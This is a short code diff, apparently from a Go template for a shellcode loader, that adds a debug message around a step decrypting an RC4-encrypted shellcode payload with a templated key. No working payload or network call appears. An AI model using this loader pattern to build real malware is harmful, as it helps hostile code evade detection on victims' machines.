@@ -1,3 +1,6 @@
+{{if .Debug}}
+printDebug("info","Decrypt RC4 payload data")
+{{end}}
 shellcode, errRc4 := decryptRc4Data(shellcode, "{{.Key}}")
 
 if errRc4 != nil {
